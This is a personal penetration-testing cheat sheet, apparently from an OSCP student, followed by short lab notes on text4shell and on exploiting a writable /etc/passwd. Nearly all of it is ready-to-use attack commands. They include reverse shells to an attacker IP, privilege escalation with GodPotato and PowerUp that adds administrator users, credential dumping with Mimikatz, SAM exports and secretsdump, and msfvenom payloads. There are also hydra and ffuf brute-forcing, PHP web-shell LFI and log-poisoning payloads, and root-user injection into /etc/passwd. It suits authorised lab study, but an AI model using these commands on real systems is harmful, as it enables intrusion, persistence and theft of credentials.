# Quickfire Bang Bang

`THESE` are all of `MY` quickfire **CMDS**!

## To-Do
```bash
find better cmds and methods to find kernel exploits.
```

## Discovery

### Nmap

```bash
fscan $ip
sudo nmap -sV -sC -sU -p 69,111,161 $ip
```

## Web

### Subdirectory fuzzing
```bash
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-directories.txt -u https://$ip/FUZZ -fc 404 -o ffufdirectories
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-words.txt -u https://$ip/FUZZ -fc 404 -o ffufwords
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-files.txt -u https://$ip/FUZZ -fc 404 -o ffuffiles
ffuf -w ~/Seclists/Discovery/Web-Content/raft-large-words.txt -u https://$ip/FUZZ -fc 404 -e php, html, csv
```

### VHost fuzzing
```bash
ffuf -u https://$ip -H "Host: FUZZ.$ip" -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt  -ac
```

### Parameter fuzzing
```bash
ffuf -w ~/Seclists -u https://$ip/$file.php?FUZZ=a -fs 4242
ffuf -w /Seclists -u https://$ip/$file.php?$param=FUZZ -fc 401
```

### Nikto
```bash
~/binaries/nikto.pl -h http://$ip -output nikto
```

### WPscan
```bash
wpscan --url http://$ip | tee wpscanshallow
wpscan --url http://$ip -e u,vp,vt | tee wpscandeep
```

### Revshells
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.X/443 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.X 443 >/tmp/f
nc -e /bin/bash 10.10.14.X 443
```
## Active Directory

### God-potato
```bash
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c net user pwn P@ssw0rd123 /add && net localgroup
GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.X 443 -e cmd.exe"
```

### NXC
```bash
nxc smb 10.10.10.10 -u user -p pass --shares
nxc smb 10.10.10.10 -u user -p pass --local-auth
nxc smb 10.10.10.10 -u admin -p pass --sam
nxc smb 10.10.10.10 -u admin -p pass --lsa
nxc smb 10.10.10.10 -u admin -p pass -M lsassy
nxc ldap 10.10.10.10 -u user -p pass --asreproast asrep.txt
nxc ldap 10.10.10.10 -u user -p pass --kerberoasting kerb.txt
nxc ldap 10.10.10.10 -u user -p pass --bloodhound --collection All --dns-server 10.10.10.10
nxc ldap 10.10.10.10 -u user -p pass --users-export users.txt
```

### Ligolo
```bash
Upload agent to target
Initialize proxy locally
1. sudo ip tuntap add user ratty mode tun ligolo
2. sudo ip link set ligolo up
3. ./proxy -selfcert
4. .\agent -connect <myip>:11601 -ignore-cert
(In ligolo interface) session >> 1
// Check if internal network route is added $ ifconfig
$ start
(on debian) sudo ip route add <internalsubnet>/24 dev ligolo
```

### Certutil
```bash
certutil.exe -urlcache -f https://www.example.org/file.exe file.exe
```

### Mimikatz
```bash
Privilege::debug
Sekurlsa::logonpasswords
Lsadump::sam
Lsadump::cache
Lsadump::secrets
```

### BloodyAD
```bash
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object "Domain Admins"
bloodyAD -d DOMAIN.LOCAL --host DC_IP -u USERNAME -p PASSWORD get writable --detail
bloodyAD -H 10.10.10.10 -d bloody -u admin -p pass get membership john.doe
bloodyAD -H 10.10.10.10 -d bloody -u admin -p pass add groupMember “Domain Admins” “john.doe”
python net.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> group -name "<TargetGroup>" -add "<TargetUser>"
```

### Bloodhound
```bash
cd ~/bloodhound
./bloodhound-cli up
```

### Post-Exploit One-Liners
```bash
reg save HKLM\SAM C:\Temp\sam && reg save HKLM\SYSTEM C:\Temp\system
secretsdump.py -sam sam -system system LOCAL
findstr /si password *.txt *.xml *.ini *.config 2>nul where /r C:\ *.kdbx *.ppk *.config 2>nul
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
gc (Get-PSReadlineOption).HistorySavePath 2>nul
```

### 
## Privilege Escalation

### Linux
```bash
id
sudo -l
crontab -l
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -writable -type d 2>/dev/null
grep "CRON" /var/log/syslog
ls -laht /etc/cron*
/usr/sbin/getcap -r / 2>/dev/null
ps aux
netstat -tulnp
ss -anp
ls -a /etc/passwd
cat /etc/iptables/rules.v4
watch -n 1 "ps -aux | grep pass"

\\ Look through root and all user directories
\\ Look in /tmp/ – /dev/shm – /var/tmp/ – /opt/ – /srv/ – /var/mail/ – /var/spool/mail/
\\ Look through /etc for anything that isnt root root, root cups, or root shadow
\\ Run linpeas if you must

dpkg -l
lsblk
mount
lsmod
/sbin/modinfo <VULNDEVICEDRIVER>
uname -r
uname -a
cat /proc/version
cat /etc/*release
```

### Windows
```bash
whoami /priv
Get-Content (Get-PSReadLineOption).HistorySavePath
certutil.exe -urlcache -split -f "http://$myip:8000/PowerUp.ps1" pu.ps1
powershell -ep bypass
Import-Module .\pu.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "net localgroup Administrators compromised_user /add"
Invoke-ServiceAbuse -Name "VulnerableServiceName" -Command "C:\Windows\Temp\reverse_shell.exe"
netstat -ano
wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
schtasks /query /fo LIST /v | findstr /i /c:"TaskName:" /c:"Task To Run:"
schtasks /run /tn "path\to\taskname"
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select Displayname
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

// Niche

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

## Password Bruting


### John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
zip2john secret.zip > ziphash.txt && john --wordlist=rockyou.txt ziphash.txt
keepass2john Database.kdbx > kphash.txt && john --wordlist=rockyou.txt kphash.txt
pdf2john document.pdf > pdfhash.txt && john --wordlist=rockyou.txt pdfhash.txt
```

### HTTP Post bruting
```bash
ffuf -w $user:USER -w /usr/share/wordlists/rockyou.txt:PASS \ 
  -X POST \ 
  -d "username=USER&password=PASS" \ 
  -H "Content-Type: application/x-www-form-urlencoded" \ 
  -u http://<TARGET_IP>/login.php \ 
  -fr “Invalid Request” 
```

### HTTP Get bruting
```bash
ffuf -w $user:USER -w /usr/share/wordlists/rockyou.txt:PASS \ 
  -u "http://<TARGET_IP>/login?user=USER&pass=PASS" \ 
  -fw 45
```

### SSH & FTP bruting
```bash
hydra -L $user -P ~/usr/share/wordlists/rockyou.txt $ip ssh
hydra -L $user -P ~/usr/share/wordlists/rockyou.txt $ip ftp
```

## Misc

### RCE & LPE binary creation
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw > shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll > shell.dll
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe > addadmin.exe
msfvenom -p windows/adduser USER=hacker PASS=ComplexP@ssw0rd! -f exe > adduser.exe
```
###  LFI
```bash

// Only relevant if site uses PHP

// Try data wrapper

echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://$ip/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

// If site allows for directory traversal try log poisoning with following cmd. And append the URL with &cmd=ls

<?php echo system($_GET['cmd']); ?>

// Then

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

// If contents of .php page are missing, use filter wrapper.

curl http://$ip/index.php?$vulnpageparam=php://filter/convert.base64-encode/resource=$vulnpage.php
echo "b64encodedoutput" | base64 -d

```

### File uploads
```bash
// If PHP is used try uploading a .PHP, .pHP, .phP, .Php, pHp, phps, php7.

// Also try writing over ssh keys in user and root dirs.
```
### API Abuse
```bash

```


## Misc notes

### text4shell

During an OSCP lab I came across an Ubuntu box running Apache Tomcat using the Java Springboot Framework. I realized pretty quickly during enum that it was vulnerable to the `text4shell` exploit. It is essentially blind os cmd injection via crafted GET request. A problem arose when I attempted to drop my revshell one liner into the `exec()` java function. It didn't work despite url encoding the entire string. So I tried a simpler string to test for code exec *that claude gave me* and my http server got a request! So what was going on???? What was happening was I was inputting `:` and `/` chars into my string which was fucking with the string interpolation. So when I tried to run `nc 192.168.45.191:80` **it would cut the string where it saw the** `:`. So the string would look like `{nc, 192.168.45.191, 80}` which doesnt work in nc. I had to run a wget to my http server holding a rev shell serving over standard port 80, and then run the revshell in a seperate GET request to obtain a shell.

**Learning moment**
```txt
Don't assume dropping shellcode into an exec() function will just implicitly run. Especially in different web frameworks. You must think about the use of chars like :, /, |, etc and how they will be handled.
```

### RCE

Recently I discovered that `rce` is literally never as easy is just copy pasting a revshell into an exec() function and calling it a day. In most cases (including in OSCP) rce has several hurdles you might have jump in order to get a shell or get a file read. For example, in most cases you have RCE via `exec()` function. These functions handle input and CE differently depending on the language or web framework used. Some of them can handle and open an interfactive nc shell while others cant. Therefore, it is best to attempt to determine what is allowing for the RCE before just jamming cmds in. Furthermore, many victim machines have firewalls blocklisting outbound over most ports.

### File zipping

In a recent lab I discovered that a folders directory tree `never` gets zipped, when getting zipped! So if a `password-protected` zip gets unzipped, it will let you do it! `unzip` will just give you the directory tree with no other data. It is important to clock this when you see it to avoid missing out on potential loot. 

**What is happening under the hood**

When a zipping binary zips a directory it appends an empty directory tree to the file, but why? Apparently it was a strategic design decision to optimize performance, `why would have to decrypt the entire directory if the user just needed one file from one folder` was the question asked. And this by and large makes sense!

### Cross-compiling c code between compiler versions

During a recent OSCP lab I discovered that `gcc` has a flag to statically link your standard library into the binary itself allowing it to run on any machine with zero dependencies. `What is the trade-off?`, it significantly increases the file size and might throw errors for some functions that don't like being statically linked.

### Writable /etc/passwd

To exploit a writable `etc/passwd` file first you need to know how the file works. It was the original place where passwords were hidden but password hashes have since moved to `/etc/shadow`. But, for backwards compatibility, any hashes in `/etc/passwd` will take precedence over shadow. This means that if we have write on passwd we can just arbitrarily change anyones passwd, we can even make new root users if we would like. To exploit this we need to know that linux typically uses the `crypt` hashing algo. A simple oneliner to exploit this uses the `openssl` binary. We can then just echo the string to the bottom of the `/etc/passwd` file.

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
